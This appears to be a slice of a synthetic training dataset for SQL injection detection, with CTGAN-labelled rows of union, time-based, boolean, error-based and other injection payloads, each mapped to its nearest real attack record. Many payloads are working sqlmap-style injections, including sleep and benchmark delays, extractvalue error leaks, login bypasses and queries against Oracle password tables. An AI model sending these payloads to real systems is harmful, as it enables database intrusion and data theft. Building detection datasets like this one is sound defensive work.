id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000388,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R007076,6.159421003294391
CTGAN_000389,attack,time,1 rlike sleep  (  5  ) ,nearest_attack_euclidean,R008994,3.300213156804831
CTGAN_000390,attack,other, (  case when 8422  =  8452 then 1 else null end  ) ,nearest_attack_euclidean,R006965,2.3119538131351103
CTGAN_000391,attack,boolean,"1'+  (  select 'gjaq' where 5449  =  5449 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R001603,3.6525964615496767
CTGAN_000392,attack,other,"  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R002018,9.189838839038195
CTGAN_000393,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R005816,4.282652404733975
CTGAN_000394,attack,other,1  )   as wshv where 5684  =  5684,nearest_attack_euclidean,R005111,3.214928856823086
CTGAN_000395,attack,other,1' where 8584  =  8584 order by 1#,nearest_attack_euclidean,R008437,3.7799451134537234
CTGAN_000396,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001890,3.125724160292084
CTGAN_000397,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R001282,3.8116018748750253
CTGAN_000398,attack,other,"iif  (  3204  =  8489,3204,1/0  )  ",nearest_attack_euclidean,R000919,4.022050145275361
CTGAN_000399,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R003939,2.9021039163130276
CTGAN_000400,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000321,6.846177226726864
CTGAN_000401,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R006219,1.8914378414869075
CTGAN_000402,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.1916202981537147
CTGAN_000403,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,10.555626955300346
CTGAN_000404,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""rtyu"" like ""rtyu",nearest_attack_euclidean,R007642,4.418862931237148
CTGAN_000405,attack,error,"1""  )   where 4182  =  4182 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008311,3.4594083268527274
CTGAN_000406,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R005959,3.302975814643475
CTGAN_000407,attack,union,"1 where 2751  =  2751 union all select null,null,null,null--",nearest_attack_euclidean,R003447,3.672370725191572
CTGAN_000408,attack,boolean,1' in boolean mode  )   and 9198  =  9198--,nearest_attack_euclidean,R007127,3.5222773561974177
CTGAN_000409,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,1.9843773434441112
CTGAN_000410,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.7000670467333765
CTGAN_000411,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",nearest_attack_euclidean,R005121,3.9984580417697004
CTGAN_000412,attack,error,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R004300,4.479293951564394
CTGAN_000413,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,49.397102888964575
CTGAN_000414,attack,boolean,"-7553%"" or 3571  =  2886",nearest_attack_euclidean,R003359,3.921101809101009
CTGAN_000415,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,3.6677677882699453
CTGAN_000416,attack,time,1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R008831,17.703574407577424
CTGAN_000417,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001118,4.307279124354551
CTGAN_000418,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R005007,3.3857229615138906
CTGAN_000419,attack,boolean,"1%'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R008910,3.846241264956185
CTGAN_000420,attack,time,1 rlike sleep  (  5  )  # urxh,nearest_attack_euclidean,R005740,1.827800561746428
CTGAN_000421,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,1.5616819809764386
CTGAN_000422,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",nearest_attack_euclidean,R003516,3.0704534526249523
CTGAN_000423,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,3.834445785382408
CTGAN_000424,attack,time,"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""pnsz"" like ""pnsz",nearest_attack_euclidean,R006277,5.813227436694772
CTGAN_000425,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000969,5.57261625024343
CTGAN_000426,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,14.354475104863784
CTGAN_000427,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.3629593871403745
CTGAN_000428,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R007830,3.221441438578109
CTGAN_000429,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R003691,4.318971529910477
CTGAN_000430,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R002880,16.20672832732528
CTGAN_000431,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000773,3.583338678050801
CTGAN_000432,attack,union,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",nearest_attack_euclidean,R004292,3.4081338767835607
CTGAN_000433,attack,boolean,"1%"" or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R007763,3.680160817344235
CTGAN_000434,attack,boolean,"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001262,3.4265783923905007
CTGAN_000435,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007887,7.119750085048893
CTGAN_000436,attack,error,"-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""bwrb"" like ""bwrb",nearest_attack_euclidean,R001510,3.7986279867156973
CTGAN_000437,attack,error,"1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R006375,3.309224017816404
CTGAN_000438,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006189,7.618612648969371
CTGAN_000439,attack,boolean,1' in boolean mode  )   and 9198  =  9198--,nearest_attack_euclidean,R007127,2.911565968697026
CTGAN_000440,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R005888,2.8900712870841456
CTGAN_000441,attack,other,"iif  (  3204  =  8489,3204,1/0  )  ",nearest_attack_euclidean,R000919,4.667496615521543
CTGAN_000442,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R007555,3.6782280751799883
CTGAN_000443,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R001552,4.669959212508912
CTGAN_000444,attack,error,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",nearest_attack_euclidean,R007392,4.689630711193032
CTGAN_000445,attack,time,1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R001800,4.604994954271178
CTGAN_000446,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R006563,3.2801054427419998
CTGAN_000447,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R005105,4.870996947426515
CTGAN_000448,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,0.7225846293351644
CTGAN_000449,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R006767,4.4191537254868
CTGAN_000450,attack,other,"iif  (  3204  =  8489,3204,1/0  )  ",nearest_attack_euclidean,R000919,2.7908192382332513
CTGAN_000451,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R001026,4.723757954554078
CTGAN_000452,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",nearest_attack_euclidean,R001376,3.539197972321776
CTGAN_000453,attack,other,select name from syscolumns where id   =     (  sele ...,nearest_attack_euclidean,R000440,3.259604891185623
CTGAN_000454,attack,other,1 exec sp_   (  or exec xp_  ) ,nearest_attack_euclidean,R000634,4.7408186299797475
CTGAN_000455,attack,other, (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R001248,4.636294790937955
CTGAN_000456,attack,other, (  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ,nearest_attack_euclidean,R002371,5.269548215642674
CTGAN_000457,attack,boolean,"admin""  )   or ""1""  =  ""1",nearest_attack_euclidean,R000213,7.05405605609603
CTGAN_000458,attack,time,"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005449,4.9860514076172215
CTGAN_000459,attack,boolean,"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""rqxd""  =  ""rqxd",nearest_attack_euclidean,R002033,4.984267341508407
CTGAN_000460,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R002741,3.492202625636008
CTGAN_000461,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R005163,2.3875813993856863
CTGAN_000462,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,nearest_attack_euclidean,R005838,2.945512986044685
CTGAN_000463,attack,other,1   )    )    as syot where 1199  =  1199,nearest_attack_euclidean,R005149,2.4001564820518824
CTGAN_000464,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000410,6.3576816210522615
CTGAN_000465,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002549,4.242082463885278
CTGAN_000466,attack,error,"  (  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )  ",nearest_attack_euclidean,R007717,1.429687758106672
CTGAN_000467,attack,union,-8760  )   where 8277  =  8277 union all select 8277--,nearest_attack_euclidean,R006924,2.0602285779259217
CTGAN_000468,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,5.2912942885429315
CTGAN_000469,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R001700,4.752738521240621
CTGAN_000470,attack,boolean,-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,nearest_attack_euclidean,R005036,1.490757569799985
CTGAN_000471,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",nearest_attack_euclidean,R006790,2.2730334937847494
CTGAN_000472,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001176,4.14243546887571
CTGAN_000473,attack,other,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",nearest_attack_euclidean,R000468,12.213599954781987
CTGAN_000474,attack,union,"-5026' where 7324  =  7324 union all select 7324,7324--",nearest_attack_euclidean,R001499,2.9916150983835674
CTGAN_000475,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R006453,2.721672957098371
CTGAN_000476,attack,error,"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R002664,3.3546597168977983
CTGAN_000477,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R003719,4.885037841327058
CTGAN_000478,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,3.2078172389271544
CTGAN_000479,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000192,6.088867956347535
CTGAN_000480,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R007468,2.653284309533634
CTGAN_000481,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",nearest_attack_euclidean,R002005,2.2414809985982993
CTGAN_000482,attack,boolean,"1'||  (  select 'fmss' from dual where 7025  =  7025 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R006600,3.8929105080658006
CTGAN_000483,attack,other,1'  )   as fkpn where 1100  =  1100,nearest_attack_euclidean,R007606,0.823996378766701
CTGAN_000484,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.540390333419967
CTGAN_000485,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,4.674877542524448
CTGAN_000486,attack,time,1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R002009,4.43130863232075
CTGAN_000487,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,6.867311664754888
CTGAN_000488,attack,other,"1,  (  case when 8260  =  8260 then 1 else null end  )  ",nearest_attack_euclidean,R002784,3.244354168705961
CTGAN_000489,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R007573,4.258854104626355
CTGAN_000490,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R008444,4.173446448036083
CTGAN_000491,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R005613,5.717619622991051
CTGAN_000492,attack,boolean,"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",nearest_attack_euclidean,R008120,5.132090085740602
CTGAN_000493,attack,time,1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,nearest_attack_euclidean,R001813,4.774153464970044
CTGAN_000494,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000867,1.8804989906601453
CTGAN_000495,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R006276,3.273041764348016
CTGAN_000496,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001840,3.299998231948978
CTGAN_000497,attack,other,1 exec sp_   (  or exec xp_  ) ,nearest_attack_euclidean,R000634,4.6074702188700245
CTGAN_000498,attack,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",nearest_attack_euclidean,R001930,3.9085686022344555
CTGAN_000499,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005110,3.027797977162066
CTGAN_000500,attack,other,"1""   )    )    as puws where 7006  =  7006",nearest_attack_euclidean,R002045,3.5068296611663468
CTGAN_000501,attack,union,"1%""  )   union all select null,null,null,null--",nearest_attack_euclidean,R002266,4.4619526797626285
CTGAN_000502,attack,error,-4906'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'pkrq'  =  'pkrq,nearest_attack_euclidean,R007562,3.0981922562896314
CTGAN_000503,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R004331,3.0398858198273944
CTGAN_000504,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,3.201271155217619
CTGAN_000505,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R006240,3.238059882652996
CTGAN_000506,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007956,3.7846571388948824
CTGAN_000507,attack,other,""" or """" """,nearest_attack_euclidean,R000286,8.630543537869038
CTGAN_000508,attack,boolean,"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",nearest_attack_euclidean,R001716,4.5189711132030785
CTGAN_000509,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,5.275019593520175
CTGAN_000510,attack,union,1'   )    )    union all select null--,nearest_attack_euclidean,R005403,7.817375676495101
CTGAN_000511,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,4.884802715924988
CTGAN_000512,attack,boolean,"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",nearest_attack_euclidean,R008385,4.628132824539041
CTGAN_000513,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006189,4.243634701019993
CTGAN_000514,attack,boolean,end and    (    (     (  'gqhc'  =  'gqhc,nearest_attack_euclidean,R007351,3.605004014136708
CTGAN_000515,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,6.088759729381715
CTGAN_000516,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R007153,4.64958377803038
CTGAN_000517,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000141,2.814193113547201
CTGAN_000518,attack,error,"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",nearest_attack_euclidean,R004295,3.14920618907792
CTGAN_000519,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,9.281425489365589
CTGAN_000520,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.588433351286998
CTGAN_000521,attack,time,1'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R001775,2.1737283622250536
CTGAN_000522,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'wvzb'  =  'wvzb,nearest_attack_euclidean,R008789,4.7572823545782885
CTGAN_000523,attack,union,"-4248""   )    )    union all select 9450,9450,9450--",nearest_attack_euclidean,R005708,3.3479189988458025
CTGAN_000524,attack,other,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005472,4.231524842795127
CTGAN_000525,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R002880,3.0681437462242895
CTGAN_000526,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R001318,6.437604098114854
CTGAN_000527,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R006838,2.297672350714583
CTGAN_000528,attack,boolean,"1' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R007852,3.261746352012907
CTGAN_000529,attack,union,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",nearest_attack_euclidean,R002114,3.4057781337544326
